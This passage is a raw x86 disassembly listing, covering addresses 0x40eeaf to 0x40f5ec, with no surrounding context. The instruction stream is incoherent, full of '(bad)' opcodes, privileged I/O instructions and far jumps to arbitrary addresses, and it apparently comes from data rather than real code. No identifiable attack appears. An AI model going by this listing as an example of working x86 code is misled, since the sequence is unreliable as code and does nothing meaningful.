  40eeaf:	cmp    ebx,esp
  40eeb1:	add    DWORD PTR [edx],0xffffffd5
  40eeb4:	cmp    cl,BYTE PTR [eax+0x56]
  40eeb7:	test   eax,0xff08a1f5
  40eebc:	adc    edi,edi
  40eebe:	mov    al,0xe0
  40eec0:	jae    0x40eef8
  40eec2:	mov    dl,0x80
  40eec4:	pop    ss
  40eec5:	xchg   edx,eax
  40eec6:	or     BYTE PTR [ecx-0x34],ah
  40eec9:	mov    edi,0xf13e234e
  40eece:	outs   dx,BYTE PTR ds:[esi]
  40eecf:	arpl   cx,bx
  40eed1:	sti    
  40eed2:	shr    bl,0xc7
  40eed5:	out    0x6b,al
  40eed7:	sti    
  40eed8:	mov    dh,0x74
  40eeda:	outs   dx,DWORD PTR ds:[esi]
  40eedb:	pop    ebp
  40eedc:	xchg   edx,eax
  40eedd:	and    BYTE PTR [edx+0x12],dl
  40eee0:	sub    DWORD PTR [esi],esi
  40eee2:	mov    WORD PTR [ebx+0x3f],fs
  40eee5:	cmp    DWORD PTR [edi-0x1151a81f],ebp
  40eeeb:	xor    DWORD PTR ss:[bx+si+0x6d],eax
  40eef0:	or     BYTE PTR [ecx+0x7bbc4cfa],ch
  40eef6:	mov    bh,0xe2
  40eef8:	jmp    0x33d0:0xf5b3fed8
  40eeff:	call   0xfc27ef00
  40ef04:	cmp    BYTE PTR cs:[ebx],ch
  40ef07:	fwait
  40ef08:	mov    ecx,0x51a67697
  40ef0d:	xchg   ebx,eax
  40ef0e:	outs   dx,BYTE PTR ds:[esi]
  40ef0f:	or     DWORD PTR [edx],edx
  40ef11:	pop    ds
  40ef12:	pop    ebp
  40ef13:	aaa    
  40ef14:	icebp  
  40ef15:	mov    esi,0x380d46e4
  40ef1a:	clc    
  40ef1b:	adc    eax,0x98d7f639
  40ef20:	add    BYTE PTR [esi-0x6d44dad7],0x29
  40ef27:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40ef29:	sub    edi,DWORD PTR [edi]
  40ef2b:	xchg   esp,eax
  40ef2c:	xor    BYTE PTR [eax],bh
  40ef2e:	(bad)  
  40ef2f:	sub    al,0xe3
  40ef31:	add    BYTE PTR [edi],bh
  40ef33:	fs pop ebx
  40ef35:	xor    eax,0x61607a6e
  40ef3a:	(bad)  
  40ef3b:	sbb    esp,DWORD PTR [esp+ebp*4-0x4ffec6e5]
  40ef42:	jecxz  0x40ef90
  40ef44:	xor    al,0x4f
  40ef46:	add    BYTE PTR [edi-0x2b],0x26
  40ef4a:	outs   dx,DWORD PTR ds:[esi]
  40ef4b:	lods   eax,DWORD PTR ds:[esi]
  40ef4c:	mov    edi,0xe6b1ee67
  40ef51:	inc    edi
  40ef52:	cld    
  40ef53:	add    al,0x76
  40ef55:	fild   QWORD PTR [esi-0x8]
  40ef58:	mov    esi,0x204c19f5
  40ef5d:	psubusb mm0,QWORD PTR [esi-0xb]
  40ef61:	loopne 0x40eee4
  40ef63:	mov    cl,0xbf
  40ef65:	jg     0x40ef28
  40ef67:	jle    0x40ef32
  40ef69:	cmp    ecx,edi
  40ef6b:	stos   DWORD PTR es:[edi],eax
  40ef6c:	cmp    esp,edx
  40ef6e:	fcom   QWORD PTR [edi]
  40ef70:	sbb    ecx,ebx
  40ef72:	outs   dx,BYTE PTR ds:[esi]
  40ef73:	ds xchg esp,eax
  40ef75:	sub    al,0xda
  40ef77:	ss mov al,0x29
  40ef7a:	in     al,dx
  40ef7b:	cmp    cl,cl
  40ef7d:	out    0x28,eax
  40ef7f:	dec    ecx
  40ef80:	mov    al,ch
  40ef82:	ss dec edx
  40ef84:	call   0xcb0a2546
  40ef89:	mov    edi,0xe9b19119
  40ef8e:	(bad)  
  40ef8f:	cmp    BYTE PTR [edx],al
  40ef91:	and    BYTE PTR [edi+esi*4],ah
  40ef94:	fcmovu st,st(5)
  40ef96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef97:	ja     0x40ef8e
  40ef99:	retf   0xafdc
  40ef9c:	jmp    0xbba098a3
  40efa1:	cmp    edx,DWORD PTR [ecx+ebx*1]
  40efa4:	and    BYTE PTR [esi+0x20578833],dh
  40efaa:	outs   dx,DWORD PTR ds:[esi]
  40efab:	sar    BYTE PTR [edi+0x1f3e8dcd],cl
  40efb1:	pop    ebp
  40efb2:	cwde   
  40efb3:	cmp    dl,bl
  40efb5:	push   ebp
  40efb6:	call   0xe82f:0xd27a7f5a
  40efbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efbe:	jmp    0x77e5b260
  40efc3:	pop    eax
  40efc4:	fst    QWORD PTR [edx-0x9]
  40efc7:	cmp    DWORD PTR [esi],edx
  40efc9:	aaa    
  40efca:	sub    edx,edi
  40efcc:	inc    eax
  40efcd:	adc    ah,dh
  40efcf:	dec    ebp
  40efd0:	loopne 0x40effe
  40efd2:	adc    DWORD PTR [eax+0x29ccaaec],ebp
  40efd8:	and    BYTE PTR [ecx+0x8],dl
  40efdb:	(bad)  
  40efdc:	repnz dec edi
  40efde:	inc    ebx
  40efdf:	or     eax,0x38413841
  40efe4:	icebp  
  40efe5:	and    DWORD PTR [ebp+0x7e41cb19],ecx
  40efeb:	inc    eax
  40efec:	pop    es
  40efed:	fs sbb eax,0xc3de723f
  40eff3:	clc    
  40eff4:	add    DWORD PTR [esi-0x33],edi
  40eff7:	cmp    cl,bh
  40eff9:	stos   BYTE PTR es:[edi],al
  40effa:	hlt    
  40effb:	inc    edx
  40effc:	and    eax,0x333e6067
  40f001:	ret    0x3924
  40f004:	pop    esp
  40f005:	push   ss
  40f006:	sub    DWORD PTR [edi+0x71],esi
  40f009:	or     bh,dl
  40f00b:	xor    ecx,DWORD PTR ds:0x7b9d05e5
  40f011:	test   al,0x5f
  40f013:	mov    ah,0x29
  40f015:	jno    0x40f086
  40f017:	(bad)  
  40f018:	mov    BYTE PTR ds:[ecx-0x45],al
  40f01c:	sbb    al,0x22
  40f01e:	idiv   BYTE PTR [eax]
  40f020:	dec    eax
  40f021:	dec    ebx
  40f022:	in     al,dx
  40f023:	jno    0x40efb7
  40f025:	add    DWORD PTR [ecx],ecx
  40f027:	(bad)  
  40f028:	adc    DWORD PTR [ebp+0x14],ebp
  40f02b:	jecxz  0x40efee
  40f02d:	fisubr WORD PTR [esi+0x29]
  40f030:	push   ebp
  40f031:	hlt    
  40f032:	stos   BYTE PTR es:[edi],al
  40f033:	aas    
  40f034:	lods   eax,DWORD PTR ds:[esi]
  40f035:	cmp    ebx,DWORD PTR [edi-0x1b]
  40f038:	mov    al,ch
  40f03a:	xchg   esp,eax
  40f03b:	add    al,0x8f
  40f03d:	mov    ds:0x33f52a64,al
  40f042:	dec    ebp
  40f043:	addr16 lahf 
  40f045:	stc    
  40f046:	xlat   BYTE PTR ds:[ebx]
  40f047:	sahf   
  40f048:	mov    cl,0x18
  40f04a:	cmp    esp,DWORD PTR [ebx]
  40f04c:	push   es
  40f04d:	js     0x40f071
  40f04f:	mov    bh,0xe0
  40f051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f052:	pusha  
  40f053:	push   es
  40f054:	cmc    
  40f055:	loopne 0x40f038
  40f057:	stc    
  40f058:	ja     0x40efe8
  40f05a:	call   0x3a82:0x433b8698
  40f061:	stc    
  40f062:	gs inc edx
  40f064:	sbb    edx,ebp
  40f066:	outs   dx,DWORD PTR ds:[esi]
  40f067:	xchg   ebx,eax
  40f068:	mov    ecx,0x80ccd8fe
  40f06d:	sub    al,0x8f
  40f06f:	fwait
  40f070:	arpl   WORD PTR [eax],di
  40f072:	out    dx,al
  40f073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f074:	int3   
  40f075:	add    dh,BYTE PTR [eax]
  40f077:	jnp    0x40f07e
  40f079:	jne    0x40f0ea
  40f07b:	loop   0x40f0e9
  40f07d:	xchg   edx,eax
  40f07e:	mov    BYTE PTR [ecx-0xb49c6db],ch
  40f084:	inc    ebx
  40f085:	imul   ebp,DWORD PTR [edi-0x6b],0x306c1778
  40f08c:	lahf   
  40f08d:	fdivr  QWORD PTR [esi+edx*2+0x6f]
  40f091:	jae    0x40f0c5
  40f093:	(bad)  [ebp-0x6fd5ee0d]
  40f099:	pop    eax
  40f09a:	mov    esi,DWORD PTR [ecx]
  40f09c:	loope  0x40f054
  40f09e:	mov    bl,0x4a
  40f0a0:	jnp    0x40f035
  40f0a2:	outs   dx,BYTE PTR ds:[esi]
  40f0a3:	cli    
  40f0a4:	push   eax
  40f0a5:	or     al,0xc0
  40f0a7:	call   0xb1ea:0x38d45599
  40f0ae:	iret   
  40f0af:	lds    edx,FWORD PTR [ebp-0x19]
  40f0b2:	aad    0xfe
  40f0b4:	call   DWORD PTR [esi+0x6f]
  40f0b7:	repz push ecx
  40f0b9:	outs   dx,DWORD PTR ds:[esi]
  40f0ba:	fsub   QWORD PTR [ecx+eiz*8-0x68c76165]
  40f0c1:	or     DWORD PTR [edi-0x557aad9e],esi
  40f0c7:	adc    eax,0x38f21c3e
  40f0cc:	out    0x4a,al
  40f0ce:	inc    edi
  40f0cf:	test   ah,al
  40f0d1:	clc    
  40f0d2:	mov    cl,0x38
  40f0d4:	aam    0x49
  40f0d6:	mov    eax,ds:0x87174509
  40f0db:	or     ch,dl
  40f0dd:	lds    ebp,FWORD PTR [esi+0x68]
  40f0e0:	ror    DWORD PTR [eax-0x2c],0xe2
  40f0e4:	sbb    bl,BYTE PTR [edi]
  40f0e6:	in     al,0x38
  40f0e8:	mov    cl,bl
  40f0ea:	dec    ebp
  40f0eb:	aas    
  40f0ec:	adc    BYTE PTR ds:[edx+esi*2],dl
  40f0f0:	cmc    
  40f0f1:	sub    edi,esi
  40f0f3:	(bad)  
  40f0f5:	loopne 0x40f126
  40f0f7:	push   ss
  40f0f8:	sar    BYTE PTR [ebx],1
  40f0fa:	mov    eax,0xaad5b20e
  40f0ff:	mov    eax,ds:0x196e8a32
  40f104:	stos   DWORD PTR es:[edi],eax
  40f105:	js     0x40f0f7
  40f107:	dec    edx
  40f108:	shl    DWORD PTR [ebx],1
  40f10a:	xchg   DWORD PTR [edi],eax
  40f10c:	mov    gs,ecx
  40f10e:	outs   dx,BYTE PTR ds:[esi]
  40f10f:	add    esp,DWORD PTR [esi-0x30]
  40f112:	dec    esp
  40f113:	(bad)  
  40f114:	or     al,0x2e
  40f116:	adc    esi,0xffffffa0
  40f119:	retf   0xedef
  40f11c:	xor    al,bh
  40f11e:	test   eax,0xa2a8a1ae
  40f123:	sbb    bh,BYTE PTR [edi+0x3d7878b4]
  40f129:	sub    dl,ch
  40f12b:	dec    BYTE PTR [ecx-0x4ddb90b0]
  40f131:	(bad)  
  40f132:	push   0x740a216
  40f137:	cmp    ebp,ebx
  40f139:	das    
  40f13a:	jecxz  0x40f131
  40f13c:	sti    
  40f13d:	popf   
  40f13e:	adc    ebp,DWORD PTR [ebx+0x33]
  40f141:	mov    ch,0x85
  40f143:	mov    ecx,0xb388b76f
  40f148:	daa    
  40f149:	mov    eax,ds:0x6cdd0653
  40f14e:	(bad)  
  40f14f:	les    esi,FWORD PTR [esi-0x578abfc5]
  40f155:	aam    0x35
  40f157:	or     ebp,edx
  40f159:	and    BYTE PTR [ebx-0x4c],dl
  40f15c:	cmc    
  40f15d:	cmp    al,BYTE PTR ds:0x950be2eb
  40f163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f164:	outs   dx,DWORD PTR ds:[esi]
  40f165:	xor    eax,0xfe7ed1d3
  40f16a:	cld    
  40f16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f16c:	adc    eax,0x2d2c7746
  40f171:	idiv   BYTE PTR [edx+eiz*4+0x6d]
  40f175:	stc    
  40f176:	out    dx,al
  40f177:	sbb    BYTE PTR [esi-0x2884f64f],ch
  40f17d:	cmp    ebp,edx
  40f17f:	bound  esp,QWORD PTR [edi]
  40f181:	add    DWORD PTR [edi],0x6ed8e080
  40f187:	cmp    bh,BYTE PTR [ebx+0x44]
  40f18a:	mov    ch,0x7e
  40f18c:	cmp    BYTE PTR [edi-0x6b],dl
  40f18f:	cmp    BYTE PTR [edx+0x1d4e6c5e],bh
  40f195:	dec    eax
  40f196:	test   al,0x14
  40f198:	cmc    
  40f199:	pop    esp
  40f19a:	ret    0xd05
  40f19d:	test   eax,0x3bcc929f
  40f1a2:	push   0xffffff87
  40f1a4:	add    BYTE PTR [esi+0x3c92574e],cl
  40f1aa:	outs   dx,BYTE PTR ds:[esi]
  40f1ab:	mov    esi,0x9f1d0d6b
  40f1b0:	mov    edi,0xbc33b62f
  40f1b5:	in     eax,dx
  40f1b6:	sti    
  40f1b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b8:	jg     0x40f1ab
  40f1ba:	repnz enter 0xbbe7,0xbd
  40f1bf:	mov    esp,0xc0e3cae4
  40f1c4:	pop    esi
  40f1c5:	addr16 loopne 0x40f180
  40f1c8:	popf   
  40f1c9:	sub    DWORD PTR [esp+ebx*8+0x53],ebx
  40f1cd:	test   eax,0x6bdd2e7a
  40f1d2:	cmp    DWORD PTR gs:[edx+eiz*8],edi
  40f1d6:	mov    ebx,?
  40f1d8:	jbe    0x40f1d0
  40f1da:	jo     0x40f233
  40f1dc:	add    eax,0xf5401b6d
  40f1e1:	inc    ebp
  40f1e2:	and    eax,DWORD PTR [ebp+0x4]
  40f1e5:	dec    ebp
  40f1e6:	xchg   edx,eax
  40f1e7:	cmp    BYTE PTR [eax-0x6c],ah
  40f1ea:	aam    0x5a
  40f1ec:	pop    ebx
  40f1ed:	pop    es
  40f1ee:	lds    ebx,FWORD PTR [esi+esi*8-0x36]
  40f1f2:	pop    edi
  40f1f3:	ret    
  40f1f4:	push   cs
  40f1f5:	cmp    eax,0x7cc55686
  40f1fa:	cmp    cl,BYTE PTR [ecx+eax*8+0x57]
  40f1fe:	cmc    
  40f1ff:	cmp    BYTE PTR [ebx-0x6f989ec0],al
  40f205:	xchg   esp,eax
  40f206:	arpl   cx,cx
  40f208:	xor    bl,dl
  40f20a:	and    bh,BYTE PTR [ecx+0x26e4d115]
  40f210:	ja     0x40f1b6
  40f212:	jmp    0x2e16ee4f
  40f217:	cmp    eax,0x6111144b
  40f21c:	repz fisttp DWORD PTR [esi+esi*1+0x47af7f5f]
  40f224:	in     eax,0x41
  40f226:	and    eax,0xb7387f03
  40f22b:	pop    edi
  40f22c:	div    BYTE PTR [ebx+esi*1+0x6edf62a8]
  40f233:	dec    ecx
  40f234:	arpl   WORD PTR [esp+ebp*4-0x37],sp
  40f238:	call   0xa40e5fc2
  40f23d:	cmp    cl,ah
  40f23f:	sti    
  40f240:	mov    bl,bl
  40f242:	dec    DWORD PTR [esi]
  40f244:	jne    0x40f1ee
  40f246:	nop
  40f247:	jbe    0x40f23e
  40f249:	mov    esp,0x8d6f2059
  40f24e:	mov    edi,0xf630bbf9
  40f253:	(bad)  
  40f254:	rcl    BYTE PTR [eax+0x63],cl
  40f257:	jmp    0xedf44419
  40f25c:	xor    BYTE PTR [ebx+esi*8+0x38],dh
  40f260:	xor    BYTE PTR [edx],ah
  40f262:	inc    ebp
  40f263:	ds fucom st(6)
  40f266:	cmp    al,0x36
  40f268:	fnstenv gs:[eax]
  40f26b:	xor    ch,dh
  40f26d:	push   ebp
  40f26e:	push   es
  40f26f:	leave  
  40f270:	test   al,0x7b
  40f272:	outs   dx,DWORD PTR ds:[esi]
  40f273:	jne    0x40f263
  40f275:	bound  edx,QWORD PTR [eax+eax*2+0x390a87b1]
  40f27c:	jp     0x40f2a3
  40f27e:	sbb    eax,DWORD PTR [ebx]
  40f280:	fisubr DWORD PTR [ecx-0x75ed015f]
  40f286:	bnd jno 0x40f27a
  40f289:	mov    ebx,0x1b024679
  40f28e:	fs cld 
  40f290:	jb     0x40f2ae
  40f292:	neg    DWORD PTR [esi]
  40f294:	xchg   ebp,eax
  40f295:	cmp    edi,DWORD PTR [ebp+0x4992985e]
  40f29b:	scas   al,BYTE PTR es:[edi]
  40f29c:	cmc    
  40f29d:	xchg   edi,eax
  40f29e:	shl    BYTE PTR [esi+0x7b],1
  40f2a1:	push   ecx
  40f2a2:	retf   0x9f10
  40f2a5:	cmp    edi,DWORD PTR [esi-0x54f329cc]
  40f2ab:	and    edi,DWORD PTR [ebx]
  40f2ad:	mov    cl,0x6e
  40f2af:	lock mov ebp,0x1a1fa0da
  40f2b5:	jg     0x40f2d3
  40f2b7:	cmp    DWORD PTR [edi],eax
  40f2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2ba:	repnz cli 
  40f2bc:	dec    edi
  40f2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2be:	mov    edi,0x26edf581
  40f2c3:	loop   0x40f341
  40f2c5:	pop    esi
  40f2c6:	icebp  
  40f2c7:	inc    DWORD PTR [eax]
  40f2c9:	or     DWORD PTR [esi+0x2f704d7a],eax
  40f2cf:	sar    DWORD PTR [esi],cl
  40f2d1:	les    edi,FWORD PTR [edx]
  40f2d3:	gs ds pop edx
  40f2d6:	es mov esp,0x15c7f9dd
  40f2dc:	test   DWORD PTR [edx],edi
  40f2de:	loopne 0x40f292
  40f2e0:	out    dx,eax
  40f2e1:	xor    eax,0x18e41e0d
  40f2e6:	xor    esi,eax
  40f2e8:	jecxz  0x40f327
  40f2ea:	mov    cl,BYTE PTR [ecx]
  40f2ec:	add    eax,0xde4d8e71
  40f2f1:	mov    ebx,0xf5f19291
  40f2f6:	test   al,0x38
  40f2f8:	add    ecx,DWORD PTR [ebp+0x1c353834]
  40f2fe:	xchg   edi,eax
  40f2ff:	mov    esi,0xc493aff5
  40f304:	push   ebx
  40f305:	push   edx
  40f306:	xor    dh,cl
  40f308:	jmp    0x40f349
  40f30a:	xor    eax,0x3990737
  40f30f:	cmp    al,0xb3
  40f311:	mov    ecx,0x8e6d7e0c
  40f316:	or     esp,ecx
  40f318:	cmc    
  40f319:	push   edi
  40f31a:	aad    0x2e
  40f31c:	push   es
  40f31d:	int3   
  40f31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31f:	push   cs
  40f320:	sar    DWORD PTR [ebx],cl
  40f322:	xchg   esp,eax
  40f323:	cwde   
  40f324:	mov    edi,DWORD PTR [edx+ebp*2-0xf]
  40f328:	push   esp
  40f329:	dec    edx
  40f32a:	outs   dx,DWORD PTR ds:[esi]
  40f32b:	and    al,0x4
  40f32d:	ror    BYTE PTR [ecx],1
  40f32f:	dec    edi
  40f330:	sub    eax,ebx
  40f332:	adc    eax,0xfab7ed3c
  40f337:	jns    0x40f390
  40f339:	sbb    eax,DWORD PTR [esi]
  40f33b:	mov    es,WORD PTR [edx+0x43]
  40f33e:	outs   dx,DWORD PTR ds:[esi]
  40f33f:	mov    ah,0x26
  40f341:	mov    bl,BYTE PTR ds:[eax-0x3c]
  40f345:	nop
  40f346:	aaa    
  40f347:	dec    ecx
  40f348:	add    BYTE PTR [eax],bh
  40f34a:	(bad)  
  40f34b:	leave  
  40f34c:	mov    ds:0x8841783,eax
  40f351:	xor    al,0x7c
  40f353:	cmp    eax,0x79562452
  40f358:	test   eax,0xfb6f356a
  40f35d:	cmp    eax,0xb0c54424
  40f362:	push   ss
  40f363:	arpl   WORD PTR ds:0x31ee6458,si
  40f369:	cwde   
  40f36a:	sar    DWORD PTR [eax+0x5509a8fe],1
  40f370:	les    ebp,FWORD PTR [edi]
  40f372:	xchg   esp,eax
  40f373:	and    eax,0x654e2a3f
  40f378:	xor    eax,0x2522e938
  40f37d:	jae    0x40f30a
  40f37f:	adc    cl,ch
  40f381:	test   al,0x40
  40f383:	pop    edi
  40f384:	push   esp
  40f385:	loopne 0x40f37c
  40f387:	sub    ah,BYTE PTR [ebx-0x79e22865]
  40f38d:	pop    esp
  40f38e:	mov    al,ds:0x5258fe2f
  40f393:	cmp    DWORD PTR [edx-0x43],edx
  40f396:	sub    eax,0x6ece2d4c
  40f39b:	and    ebp,DWORD PTR [edx+0x72c9cef7]
  40f3a1:	xchg   BYTE PTR [esi+0x39],al
  40f3a4:	sub    al,0xc3
  40f3a6:	mov    al,0x30
  40f3a8:	outs   dx,BYTE PTR ds:[esi]
  40f3a9:	in     al,dx
  40f3aa:	or     esp,DWORD PTR [edi-0x5e702a0b]
  40f3b0:	fsubr  DWORD PTR [esi]
  40f3b2:	mov    edx,0x743d4123
  40f3b7:	lahf   
  40f3b8:	add    BYTE PTR [ecx+0x1cd56aaf],ch
  40f3be:	gs sub al,0xf7
  40f3c1:	sub    DWORD PTR [esi],ebp
  40f3c3:	xchg   ecx,eax
  40f3c4:	dec    esp
  40f3c5:	mov    edx,0xdf66f922
  40f3ca:	mov    bl,0x3f
  40f3cc:	cdq    
  40f3cd:	mov    edx,0xe4dac605
  40f3d2:	(bad)  
  40f3d3:	and    eax,0xf86f4210
  40f3d8:	dec    esi
  40f3d9:	push   edx
  40f3da:	popf   
  40f3db:	int3   
  40f3dc:	test   BYTE PTR [ebx],cl
  40f3de:	nop
  40f3df:	push   es
  40f3e0:	pop    esp
  40f3e1:	imul   ebp,edi,0xffffffb6
  40f3e4:	call   0x5eec32c3
  40f3e9:	sub    BYTE PTR [esi-0x80],0x3b
  40f3ed:	aam    0x8b
  40f3ef:	mov    WORD PTR [ebx-0x6daf224],es
  40f3f5:	test   bh,bh
  40f3f7:	clc    
  40f3f8:	pop    edx
  40f3f9:	dec    edx
  40f3fa:	jnp    0x40f3c4
  40f3fc:	sbb    esp,DWORD PTR [ebx+0x6f]
  40f3ff:	loope  0x40f3f1
  40f401:	fiadd  DWORD PTR [esi-0x63a0d3ca]
  40f407:	and    eax,0xa843f8cd
  40f40c:	dec    ebp
  40f40d:	ss je  0x40f452
  40f410:	adc    al,0xb2
  40f412:	outs   dx,BYTE PTR ds:[esi]
  40f413:	ret    0x4c9a
  40f416:	xchg   DWORD PTR [ecx],esp
  40f418:	rcr    edx,1
  40f41a:	jmp    0xd560:0x907f625
  40f421:	arpl   WORD PTR [esi+edi*1+0x62],sp
  40f425:	cld    
  40f426:	aad    0x2b
  40f428:	sti    
  40f429:	add    ebp,DWORD PTR [edx]
  40f42b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f42c:	mov    eax,0x36c90f3b
  40f431:	stos   BYTE PTR es:[edi],al
  40f432:	aaa    
  40f433:	mov    cl,0xee
  40f435:	stos   DWORD PTR es:[edi],eax
  40f436:	outs   dx,BYTE PTR ds:[esi]
  40f437:	(bad)  
  40f438:	fld    DWORD PTR [edx+0x2e583c0b]
  40f43e:	jns    0x40f478
  40f440:	adc    bl,BYTE PTR [ebx+0x11bd5aef]
  40f446:	and    dl,BYTE PTR [esi]
  40f448:	cmc    
  40f449:	ja     0x40f420
  40f44b:	fdivrp st(7),st
  40f44d:	popf   
  40f44e:	push   edi
  40f44f:	fidivr DWORD PTR [esi-0x47]
  40f452:	pop    edx
  40f453:	cmp    DWORD PTR [eax+0x20],edi
  40f456:	xchg   ebx,eax
  40f457:	cmp    esi,esi
  40f459:	mov    dl,BYTE PTR [edi+0x4910f662]
  40f45f:	retf   
  40f460:	or     BYTE PTR [edx],ch
  40f462:	add    esi,DWORD PTR ss:[edi+0x2cf55d5a]
  40f469:	mov    dl,0x9e
  40f46b:	jns    0x40f404
  40f46d:	dec    DWORD PTR [eax-0x8]
  40f470:	lahf   
  40f471:	push   ss
  40f472:	sub    BYTE PTR [eax+esi*8-0x34],0x84
  40f477:	cmp    BYTE PTR [edx+ebx*1],dl
  40f47a:	xchg   ecx,eax
  40f47b:	sbb    al,BYTE PTR [esi]
  40f47d:	shr    BYTE PTR [edi-0x19],cl
  40f480:	mov    al,0x57
  40f482:	int    0xa3
  40f484:	sub    DWORD PTR [ebx+edx*2],0xbf38294a
  40f48b:	clc    
  40f48c:	in     al,dx
  40f48d:	mov    al,ds:0xf71aeb6d
  40f492:	or     BYTE PTR [esi-0x249053c8],0xef
  40f499:	scas   eax,DWORD PTR es:[edi]
  40f49a:	or     eax,0xd1f3a97c
  40f49f:	cmp    BYTE PTR [edx+0x27],dh
  40f4a2:	inc    ebx
  40f4a3:	and    BYTE PTR [esi],dh
  40f4a5:	(bad)  
  40f4a6:	mov    ecx,0x4d4c0b91
  40f4ab:	inc    edx
  40f4ac:	cmc    
  40f4ad:	push   es
  40f4ae:	out    dx,eax
  40f4af:	xchg   edx,eax
  40f4b0:	mov    eax,ds:0xe395d5c
  40f4b5:	and    al,0x57
  40f4b7:	imul   eax,DWORD PTR [edx+eax*4-0x36],0x76c0f5ac
  40f4bf:	ror    DWORD PTR [edx-0x2f7e45f1],0x3b
  40f4c6:	cmp    al,0x5
  40f4c8:	push   edi
  40f4c9:	xchg   ebp,eax
  40f4ca:	loop   0x40f4eb
  40f4cc:	aad    0x4
  40f4ce:	outs   dx,BYTE PTR ds:[esi]
  40f4cf:	cmp    edx,DWORD PTR [edx-0x6cc4c1ae]
  40f4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d6:	adc    BYTE PTR [ecx],bh
  40f4d8:	gs ins DWORD PTR es:[edi],dx
  40f4da:	lods   al,BYTE PTR ds:[esi]
  40f4db:	lock push esi
  40f4dd:	xor    ebp,DWORD PTR [edi-0x20490a30]
  40f4e3:	outs   dx,BYTE PTR ds:[esi]
  40f4e4:	in     eax,0x81
  40f4e6:	mov    bl,0xb3
  40f4e8:	repnz daa 
  40f4ea:	lods   eax,DWORD PTR ds:[esi]
  40f4eb:	cmp    BYTE PTR [ecx-0x4c64216a],ch
  40f4f1:	inc    ebp
  40f4f2:	mov    ds:0x36e8f576,al
  40f4f7:	js     0x40f4b7
  40f4f9:	(bad)  
  40f4fa:	xor    al,0x3
  40f4fc:	and    edi,DWORD PTR [eax]
  40f4fe:	jp     0x40f531
  40f500:	popa   
  40f501:	pop    ss
  40f502:	pop    ebp
  40f503:	dec    ebx
  40f504:	pop    eax
  40f505:	les    ebp,FWORD PTR [ecx-0x15]
  40f508:	ds fcmovnu st,st(4)
  40f50b:	mov    ds:0xf7fd63b8,al
  40f510:	adc    edi,DWORD PTR [eax]
  40f512:	adc    ah,dl
  40f514:	repnz lods al,BYTE PTR ds:[esi]
  40f516:	std    
  40f517:	adc    dl,ah
  40f519:	mov    gs,WORD PTR [esi+0x42]
  40f51c:	sub    eax,0xa7afd551
  40f521:	dec    esp
  40f522:	cmp    BYTE PTR [eax],0x73
  40f525:	push   ss
  40f526:	mov    ds:0x9dd00de2,eax
  40f52b:	dec    ecx
  40f52c:	xor    ebx,DWORD PTR [edx+0x297438b6]
  40f532:	mov    ds:0xe8413036,eax
  40f537:	cmp    ah,ah
  40f539:	pop    ebp
  40f53a:	push   edi
  40f53b:	imul   ecx,DWORD PTR [ebx-0x7a45cda1],0x27
  40f542:	outs   dx,DWORD PTR ds:[esi]
  40f543:	and    esp,DWORD PTR [ebp+0x3f]
  40f546:	mov    edx,0xceecfc52
  40f54b:	sub    esi,esi
  40f54d:	adc    ecx,ebx
  40f54f:	jae    0x40f526
  40f551:	rcl    BYTE PTR [esi+0x4d],cl
  40f554:	mov    edx,DWORD PTR [esi+0x5f17726e]
  40f55a:	sbb    eax,DWORD PTR [eax-0x7c]
  40f55d:	dec    esi
  40f55e:	(bad)  
  40f55f:	sbb    ebp,esp
  40f561:	(bad)  
  40f562:	adc    DWORD PTR [ecx-0x2a],edi
  40f565:	mov    bl,0x57
  40f567:	mov    bl,0x5f
  40f569:	sbb    BYTE PTR [esp+eiz*8+0x5],bh
  40f56d:	into   
  40f56e:	xor    BYTE PTR [ecx],bh
  40f570:	cmp    al,0x4a
  40f572:	(bad)  
  40f573:	out    dx,eax
  40f574:	cmp    edi,DWORD PTR [eax]
  40f576:	and    BYTE PTR [edx-0x5bb27f1b],dl
  40f57c:	fcom   QWORD PTR [eax+0x6f]
  40f57f:	idiv   BYTE PTR [ecx]
  40f581:	mov    bh,0x18
  40f583:	out    0xb6,eax
  40f585:	out    dx,al
  40f586:	dec    eax
  40f587:	inc    ebp
  40f588:	xchg   esi,eax
  40f589:	mov    ds:0x3c1d33a8,eax
  40f58e:	jnp    0x40f5ca
  40f590:	(bad)  
  40f591:	jge    0x40f59f
  40f593:	xchg   ecx,eax
  40f594:	mov    ch,0xa3
  40f596:	shl    BYTE PTR [ebp-0xa],0x7f
  40f59a:	ds int3 
  40f59c:	test   DWORD PTR [ebx],eax
  40f59e:	(bad)  
  40f59f:	cld    
  40f5a0:	rcl    DWORD PTR [edi-0x352fc795],0x9c
  40f5a7:	xchg   ebp,eax
  40f5a8:	push   eax
  40f5a9:	out    dx,eax
  40f5aa:	push   cs
  40f5ab:	push   ds
  40f5ac:	cmc    
  40f5ad:	enter  0x7d5d,0x4
  40f5b1:	mov    esi,0x3bb4448d
  40f5b6:	push   eax
  40f5b7:	or     DWORD PTR [edx-0x5],esp
  40f5ba:	mov    al,ds:0x6f713c69
  40f5bf:	mov    esp,esi
  40f5c1:	jle    0x40f5a8
  40f5c3:	and    dl,BYTE PTR [ecx-0x2d]
  40f5c6:	fsub   DWORD PTR [eax-0x7a68c7af]
  40f5cc:	iret   
  40f5cd:	ss push ecx
  40f5cf:	sub    DWORD PTR [edi-0xa92ad2c],0xcd829d4e
  40f5d9:	cmp    eax,0x3b8024de
  40f5de:	test   al,0x47
  40f5e0:	data16 jae 0x40f60e
  40f5e3:	and    bl,BYTE PTR [ecx]
  40f5e5:	jns    0x40f656
  40f5e7:	wrmsr  
  40f5e9:	scas   al,BYTE PTR es:[edi]
  40f5ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5eb:	push   es
  40f5ec:	jae    0x40f5a8
